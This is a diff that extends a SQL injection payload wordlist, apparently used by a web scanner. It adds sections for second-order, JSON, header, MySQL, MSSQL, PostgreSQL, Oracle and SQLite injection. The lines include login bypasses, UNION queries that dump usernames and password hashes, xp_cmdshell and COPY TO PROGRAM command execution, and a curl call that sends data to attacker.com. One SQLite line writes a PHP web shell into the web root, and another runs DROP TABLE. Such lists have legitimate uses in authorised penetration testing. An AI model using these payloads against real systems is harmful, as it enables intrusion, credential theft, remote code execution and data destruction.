@@ -229,3 +229,91 @@ EXP(~(SELECT * FROM (SELECT SLEEP(3))x))
 1'1
 a'or'1'='1
 a"or"1"="1
+
+# ── SECOND-ORDER INJECTION MARKERS ──
+ws_so_' OR '1'='1
+ws_so_" OR "1"="1
+ws_so_'; SELECT version()--
+ws_so_" UNION SELECT NULL--
+ws_so_`id`
+ws_so_'; WAITFOR DELAY '0:0:3'--
+ws_so_' AND SLEEP(3)--
+
+# ── JSON/REST BODY INJECTION ──
+1' OR '1'='1
+1" OR "1"="1
+{"$gt": ""}
+{"$ne": null}
+{"$where": "sleep(3000)"}
+1; DROP TABLE users--
+' UNION SELECT 1,2,3--
+admin'--
+admin' #
+' OR 1=1 LIMIT 1--
+1 OR 1=1 LIMIT 1--
+
+# ── HTTP HEADER INJECTION ──
+127.0.0.1' OR '1'='1
+127.0.0.1' AND SLEEP(3)--
+127.0.0.1' UNION SELECT 1,2,3--
+Mozilla/5.0' OR '1'='1
+Mozilla/5.0' AND SLEEP(3)--
+/ OR '1'='1
+/' OR '1'='1
+
+# ── ADVANCED MySQL ──
+' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(0x7e,0x27,(SELECT version()),0x27,0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' UNION SELECT 1,group_concat(schema_name SEPARATOR ','),3 FROM information_schema.schemata--
+' UNION SELECT 1,group_concat(table_name SEPARATOR ','),3 FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,group_concat(column_name SEPARATOR ','),3 FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT 1,group_concat(username,0x3a,password SEPARATOR ','),3 FROM users--
+' AND JSON_ARRAYAGG(version())--
+' AND 1=EXP(~(SELECT * FROM(SELECT version())a))--
+' AND 1=(SELECT 1 FROM mysql.user LIMIT 1)--
+' RLIKE (SELECT (CASE WHEN (1=1) THEN 0x61 ELSE 1 END))--
+';USE information_schema; SELECT table_name FROM tables LIMIT 1--
+
+# ── ADVANCED MSSQL ──
+'; EXEC xp_fileexist 'C:\Windows\win.ini'--
+'; EXEC xp_regread 'HKLM','SOFTWARE\Microsoft\Windows NT\CurrentVersion','ProductName'--
+'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\ws_out.txt','SELECT * FROM users'--
+'; SELECT * FROM OPENROWSET('SQLOLEDB','Server=(local);UID=sa;PWD=','SELECT 1')--
+'; SELECT * FROM fn_trace_gettable(N'C:\t.trc',default)--
+' AND 1=1; EXEC xp_cmdshell 'ping -n 3 127.0.0.1'--
+' UNION SELECT NULL,NULL,master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins--
+' UNION SELECT TOP 1 name,NULL,NULL FROM sysobjects WHERE xtype='U'--
+'; BACKUP DATABASE master TO DISK='C:\inetpub\wwwroot\ws_backup.bak'--
+
+# ── ADVANCED PostgreSQL ──
+'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?x='||version()--
+'; SELECT pg_read_binary_file('/etc/passwd')--
+'; CREATE TABLE ws_cmd(c text); COPY ws_cmd FROM PROGRAM 'id'; SELECT c FROM ws_cmd--
+' UNION SELECT 1,string_agg(usename||':'||passwd,' ,'),3 FROM pg_shadow--
+' UNION SELECT 1,string_agg(table_name,','),3 FROM information_schema.tables--
+'; SELECT lo_import('/etc/passwd',1337)--
+'; SELECT lo_export(1337,'/var/www/html/ws_out.txt')--
+' AND 1=(SELECT CASE WHEN (username='admin') THEN 1 ELSE 0 END FROM users LIMIT 1)--
+
+# ── ADVANCED Oracle ──
+' UNION SELECT NULL,SYS.UTL_FILE.GET_LINE(SYS.UTL_FILE.FOPEN('/etc','passwd','r'),1,1024),NULL FROM dual--
+' UNION SELECT NULL,DBMS_XMLQUERY.GETXML('SELECT banner FROM v$version'),NULL FROM dual--
+' UNION SELECT NULL,CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual)),NULL FROM dual--
+'; BEGIN SYS.DBMS_LDAP.INIT((SELECT version FROM v$instance),80); END;--
+' AND 1=(SELECT DECODE(SUBSTR(username,1,1),'S',1,0) FROM dba_users WHERE rownum=1)--
+
+# ── ADVANCED SQLite ──
+' UNION SELECT NULL,tbl_name,NULL FROM sqlite_master WHERE type='table'--
+' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE type='table' AND tbl_name='users'--
+'; ATTACH DATABASE '/var/www/html/ws_shell.php' AS ws; CREATE TABLE ws.x(y text); INSERT INTO ws.x VALUES('<?php system($_GET[c]);?>'); --
+' AND (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table')='43'--
+
+# ── HPP / PARAMETER POLLUTION ──
+id=1&id=1 UNION SELECT 1,2,3--
+id=1 UNION SELECT 1,2,3--&id=1
+id[]=1&id[]=1 OR 1=1--
+id=1;SELECT 1&id=1
+
+# ── DOUBLE ENCODING ──
+%2527%2520OR%25201%253D1
+%27%20OR%20%271%27%3D%271--
+%2560%2520OR%2520%25601%2560%253D%25601
